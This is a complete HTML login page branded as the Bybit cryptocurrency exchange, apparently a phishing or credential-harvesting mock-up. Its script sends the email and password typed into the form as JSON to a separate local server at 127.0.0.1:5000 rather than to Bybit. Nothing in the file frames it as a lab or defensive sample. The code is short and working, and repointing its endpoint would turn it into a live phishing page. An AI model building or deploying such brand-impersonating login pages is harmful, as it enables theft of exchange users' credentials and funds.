<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bybit Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: white;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #2c2c2c;
            padding: 20px;
            color: white;
            border-radius: 10px;
            width: 300px;
            text-align: left;
        }
        input {
            width: 95%;
            padding: 10px;
            margin: 30px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        button {
            padding: 10px;
            margin: 30px 0;
            width: 100%;
            background-color: orange;
            border: none;
            color: black;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background-color: #cc3700;
        }
        #result {
            color: #ff6666;
            font-size: 14px;
            text-align: center;
        }
        p.forgot-password {
            text-align: left;
            color: #aaa;
            cursor: pointer;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Bybit Login</h1>
        <form id="loginForm" onsubmit="return false;">
            <input type="text" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <p class="forgot-password" onclick="alert('Forgot Password clicked')">Forgot Password</p>
            <button type="submit">Login Now</button>
        </form>
        <div id="result"></div> <!-- Display login result here -->
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const result = document.getElementById('result');

        form.addEventListener('submit', async (event) => {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            try {
                const response = await fetch('http://127.0.0.1:5000/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ email, password })
                });

                const data = await response.json();
                result.textContent = data.message; // Show the response message

            } catch (error) {
                result.textContent = 'Error connecting to server.';
            }
        });
    </script>
</body>
</html>
